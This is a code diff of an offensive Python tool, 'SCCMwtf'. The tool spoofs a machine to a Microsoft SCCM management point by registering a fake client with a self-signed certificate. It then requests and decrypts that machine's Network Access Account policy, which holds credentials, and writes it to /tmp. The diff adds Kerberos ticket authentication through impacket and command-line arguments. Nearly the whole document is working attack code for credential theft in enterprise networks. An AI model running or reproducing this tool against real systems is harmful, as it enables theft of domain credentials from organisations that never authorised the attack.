@@ -1,9 +1,12 @@
+import argparse
 import datetime
 import zlib
 import requests
 import re
 import time
+import os
 import sys
+import impacket
 from pyasn1.codec.der.decoder import decode
 from pyasn1_modules import rfc5652
 from cryptography.hazmat.primitives import serialization
@@ -17,6 +20,8 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.x509 import ObjectIdentifier
 from requests_toolbelt.multipart import decoder
 from requests_ntlm import HttpNtlmAuth
+from requests_kerberos import HTTPKerberosAuth, REQUIRED, DISABLED
+from impacket.examples.getTGT import GETTGT
 
 # Who needs just 1 date format :/
 dateFormat1 = "%Y-%m-%dT%H:%M:%SZ"
@@ -34,15 +39,16 @@ policyBody = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType
 reportBody = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody /></Report>"""
 
 class Tools:
-  @staticmethod
-  def encode_unicode(input):
-    # Remove the BOM
-    return input.encode('utf-16')[2:]
+    @staticmethod
+    def encode_unicode(input):
+        # Remove the BOM
+        return input.encode('utf-16')[2:]
 
-  @staticmethod
-  def write_to_file(input, file):
-    with open(file, "w") as fd:
-      fd.write(input)
+    @staticmethod
+    def write_to_file(input, file):
+        with open(file, "w") as fd:
+            fd.write(input)
+
 
 class CryptoTools:
     @staticmethod
@@ -64,8 +70,8 @@ class CryptoTools:
             datetime.datetime.utcnow() + datetime.timedelta(days=365)
         ).add_extension(
             x509.KeyUsage(digital_signature=True, key_encipherment=False, key_cert_sign=False,
-                                  key_agreement=False, content_commitment=False, data_encipherment=True,
-                                  crl_sign=False, encipher_only=False, decipher_only=False),
+                          key_agreement=False, content_commitment=False, data_encipherment=True,
+                          crl_sign=False, encipher_only=False, decipher_only=False),
             critical=False,
         ).add_extension(
             # SMS Signing Certificate (Self-Signed)
@@ -115,11 +121,16 @@ class CryptoTools:
         decryptor = cipher.decryptor()
         return decryptor.update(data) + decryptor.finalize()
 
+
 class SCCMTools:
 
-    def __init__(self, server):
+    def __init__(self, server, auth_, target_name, target_fqdn):
+        self.key = None
         self._server = server
         self._serverURI = f"http://{server}"
+        self._target_name = target_name
+        self._target_fqdn = target_fqdn
+        self._auth = auth_
 
     def sendCCMPostRequest(self, data, auth=False, username="", password=""):
         headers = {
@@ -128,10 +139,19 @@ class SCCMTools:
             "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
         }
 
-        if auth:
-          r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
-        else:
-          r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
+        if not auth:
+            r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
+        elif auth.upper() == 'TGT':
+            kerberos_auth = HTTPKerberosAuth(
+                hostname_override=f"{self._target_name}@{self._target_fqdn}",
+                mutual_authentication=DISABLED,
+                delegate=True,
+                principal=os.environ.get('KRB5CCNAME')
+            )
+            r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers,
+                                 data=data, auth=kerberos_auth)
+        elif auth.upper() == 'NTLM':
+            r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
 
         multipart_data = decoder.MultipartDecoder.from_response(r)
         for part in multipart_data.parts:
@@ -145,17 +165,18 @@ class SCCMTools:
         }
 
         if authHeaders == True:
-          headers["ClientToken"] = "GUID:{};{};2".format(
-            clientID, 
-            now.strftime(dateFormat1)
-          )
-          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
+            headers["ClientToken"] = "GUID:{};{};2".format(
+                clientID,
+                now.strftime(dateFormat1)
+            )
+            headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(
+                clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
 
-        r = requests.get(f"{self._serverURI}"+url, headers=headers)
-        if retcontent == True:
-          return r.content
+        r = requests.get(f"{self._serverURI}" + url, headers=headers)
+        if retcontent:
+            return r.content
         else:
-          return r.text
+            return r.text
 
     def createCertificate(self, writeToTmp=False):
         self.key = CryptoTools.generateRSAKey()
@@ -164,8 +185,8 @@ class SCCMTools:
         if writeToTmp:
             with open("/tmp/key.pem", "wb") as f:
                 f.write(self.key.private_bytes(
-                    encoding=serialization.Encoding.PEM, 
-                    format=serialization.PrivateFormat.TraditionalOpenSSL, 
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                     encryption_algorithm=serialization.BestAvailableEncryption(b"mimikatz"),
                 ))
 
@@ -176,26 +197,30 @@ class SCCMTools:
         b = self.cert.public_bytes(serialization.Encoding.DER).hex().upper()
 
         embedded = registrationRequest.format(
-          date=now.strftime(dateFormat1), 
-          encryption=b, 
-          signature=b, 
-          client=name, 
-          clientfqdn=fqname
+            date=now.strftime(dateFormat1),
+            encryption=b,
+            signature=b,
+            client=name,
+            clientfqdn=fqname
         )
 
         signature = CryptoTools.sign(self.key, Tools.encode_unicode(embedded)).hex().upper()
-        request = Tools.encode_unicode(registrationRequestWrapper.format(data=embedded, signature=signature)) + "\r\n".encode('ascii')
+        request = Tools.encode_unicode(
+            registrationRequestWrapper.format(data=embedded, signature=signature)) + "\r\n".encode('ascii')
 
         header = msgHeader.format(
-          bodylength=len(request)-2, 
-          client=name, 
-          date=now.strftime(dateFormat1), 
-          sccmserver=self._server
+            bodylength=len(request) - 2,
+            client=name,
+            date=now.strftime(dateFormat1),
+            sccmserver=self._server
         )
 
-        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + zlib.compress(request) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
+        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode(
+            'ascii') + header.encode(
+            'utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode(
+            'ascii') + zlib.compress(request) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
 
-        deflatedData = self.sendCCMPostRequest(data, True, username, password)
+        deflatedData = self.sendCCMPostRequest(data, self._auth, username, password)
         r = re.findall("SMSID=\"GUID:([^\"]+)\"", deflatedData)
         if r != None:
             return r[0]
@@ -203,36 +228,42 @@ class SCCMTools:
         return None
 
     def sendPolicyRequest(self, name, fqname, uuid, targetName, targetFQDN, targetUUID):
-        body = Tools.encode_unicode(policyBody.format(clientid=targetUUID, clientfqdn=targetFQDN, client=targetName)) + b"\x00\x00\r\n"
+        body = Tools.encode_unicode(
+            policyBody.format(clientid=targetUUID, clientfqdn=targetFQDN, client=targetName)) + b"\x00\x00\r\n"
         payloadCompressed = zlib.compress(body)
 
         bodyCompressed = zlib.compress(body)
         public_key = CryptoTools.buildMSPublicKeyBlob(self.key)
         clientID = f"GUID:{uuid.upper()}"
-        clientIDSignature = CryptoTools.sign(self.key, Tools.encode_unicode(clientID) + "\x00\x00".encode('ascii')).hex().upper()
+        clientIDSignature = CryptoTools.sign(self.key,
+                                             Tools.encode_unicode(clientID) + "\x00\x00".encode('ascii')).hex().upper()
         payloadSignature = CryptoTools.sign(self.key, bodyCompressed).hex().upper()
 
         header = msgHeaderPolicy.format(
-          bodylength=len(body)-2, 
-          sccmserver=self._server, 
-          client=name, 
-          publickey=public_key, 
-          clientIDsignature=clientIDSignature, 
-          payloadsignature=payloadSignature, 
-          clientid=uuid, 
-          date=now.strftime(dateFormat1)
+            bodylength=len(body) - 2,
+            sccmserver=self._server,
+            client=name,
+            publickey=public_key,
+            clientIDsignature=clientIDSignature,
+            payloadsignature=payloadSignature,
+            clientid=uuid,
+            date=now.strftime(dateFormat1)
         )
 
-        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
+        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode(
+            'ascii') + header.encode(
+            'utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode(
+            'ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
 
         deflatedData = self.sendCCMPostRequest(data)
-        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
-        #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
+        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData,
+                           re.DOTALL + re.MULTILINE)
+        # r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
         return [result.group(1)]
 
-    def parseEncryptedPolicy(self, result):
+    def parseEncryptedPolicy(self, result_):
         # Man.. asn1 suxx!
-        content, rest = decode(result, asn1Spec=rfc5652.ContentInfo())
+        content, rest = decode(result_, asn1Spec=rfc5652.ContentInfo())
         content, rest = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
         encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
         iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
@@ -240,17 +271,44 @@ class SCCMTools:
 
         decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
         policy = decrypted.decode('utf-16')
+
         return policy
 
-if __name__ == "__main__":
-    
-    print("SCCMwtf... by @_xpn_")
 
-    target_name = sys.argv[1]
-    target_fqdn = sys.argv[2]
-    target_sccm = sys.argv[3]
-    target_username = sys.argv[4]
-    target_password = sys.argv[5]
+if __name__ == "__main__":
+
+    print("SCCMwtf... by @_xpn_ updated by wolfthefallen")
+    parser = argparse.ArgumentParser(
+        add_help=True,
+        description="Will conduct SCCM WTF attack, this script has been modified to use kerborse tickets"
+    )
+    parser.add_argument("spoof_name", action='store', help="Name to spoof")
+    parser.add_argument("spoof_fqdn", action='store', help="Fully qualified domain name to spoof")
+    parser.add_argument("target_sccm", action='store', help="Target SCCM to use in the attack")
+    parser.add_argument("username", action='store', help="Username to use in the attack")
+    parser.add_argument("password", action='store', help="Password for username")
+    parser.add_argument("auth", action='store', help="Type of authentication to use, NTLM or TGT")
+
+    args = parser.parse_args()
+
+    target_name = args.spoof_name
+    target_fqdn = args.spoof_fqdn
+    target_sccm = args.target_sccm
+    target_username = args.username
+    target_password = args.password
+    if 'NTLM' in args.auth.upper():
+        auth = 'NTLM'
+    elif 'TGT' in args.auth.upper():
+        auth = 'TGT'
+    else:
+        print(f"[!] auth is not NTLM or TGT exiting")
+        sys.exit()
+
+    if auth.upper() == 'TGT':
+        tgt_saver = GETTGT(target_username, target_password, target_fqdn)
+        tgt_saver.run()
+        tgt_file = target_username + '.ccache'
+        os.environ['KRB5CCNAME'] = tgt_file
 
     print("[*] Args: ")
     print(f"[*] Spoof Name: {target_name}")
@@ -258,11 +316,12 @@ if __name__ == "__main__":
     print(f"[*] Target SCCM: {target_sccm}")
     print(f"[*] Computer account username: {target_username}")
     print(f"[*] Computer account password: {target_password}")
+    print(F"[*] Type of Authentication: {auth}")
 
     print("[*] Creating certificate for our fake server...")
-    tools = SCCMTools(target_sccm)
+    tools = SCCMTools(target_sccm, auth, target_name, target_fqdn)
     tools.createCertificate(True)
-    
+
     print("[*] Registering our fake server...")
     uuid = tools.sendRegistration(target_name, target_fqdn, target_username, target_password)
 
@@ -279,8 +338,8 @@ if __name__ == "__main__":
     for url in urls:
         result = tools.requestPolicy(url)
         if result.startswith("<HTML>"):
-          result = tools.requestPolicy(url, uuid, True, True)
-          decryptedResult = tools.parseEncryptedPolicy(result)
-          Tools.write_to_file(decryptedResult, "/tmp/naapolicy.xml")
+            result = tools.requestPolicy(url, uuid, True, True)
+            decryptedResult = tools.parseEncryptedPolicy(result)
+            Tools.write_to_file(decryptedResult, "/tmp/naapolicy.xml")
 
     print("[*] Done.. decrypted policy dumped to /tmp/naapolicy.xml")
